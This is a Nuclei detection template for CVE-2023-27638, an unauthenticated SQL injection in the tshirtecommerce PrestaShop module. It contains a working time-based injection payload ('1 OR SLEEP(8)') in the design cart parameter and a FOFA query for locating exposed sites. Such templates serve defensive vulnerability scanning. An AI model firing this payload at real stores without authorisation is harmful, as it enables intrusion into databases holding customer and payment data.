id: CVE-2023-27638

info:
  name: tshirtecommerce PrestaShop Module - SQL Injection
  author: ritikchaddha
  severity: high
  description: |
    The tshirtecommerce module for PrestaShop is vulnerable to unauthenticated SQL injection via the tshirtecommerce_design_cart_id parameter, allowing attackers to execute arbitrary SQL queries and extract sensitive information from the database. This is due to lack of input sanitization, as shown in the patch where pSQL() is now used.
  impact: |
    Unauthenticated attackers can execute SQL injection through the tshirtecommerce_design_cart_id parameter to extract the complete PrestaShop database including customer data and payment information.
  remediation: |
    Update the tshirtecommerce module to the latest version and apply all security patches.
  reference:
    - https://security.friendsofpresta.org/module/2023/03/21/tshirtecommerce_cwe-89.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-27638
  classification:
    cve-id: CVE-2023-27638
    cwe-id: CWE-89
    epss-score: 0.58686
    epss-percentile: 0.98135
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    max-request: 1
    vendor: tshirtecommerce
    product: prestashop
    fofa-query: body="Prestashop" && body="tshirtecommerce"
  tags: cve,cve2023,prestashop,tshirtecommerce,sqli,vkev,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    matchers:
      - type: dsl
        dsl:
          - "contains_all(tolower(body), 'prestashop', 'tshirtecommerce')"
          - "status_code == 200"
        condition: and
        internal: true

  - raw:
      - |
        @timeout: 30s
        GET /module/tshirtecommerce/designer?tshirtecommerce_design_cart_id=1%20OR%20SLEEP(8) HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=8"
          - "status_code == 200"
        condition: and
# digest: 4a0a00473045022100856733bba8fdcbf598183ae53978aae6ae7669d402e060a94cf06d35ec2e272902206571a58b8d9fe11646b10f9334f82a61811ff2d76f5dfb0db8d92b3d4d7eceee:922c64590222798bb761d5b6d8e72950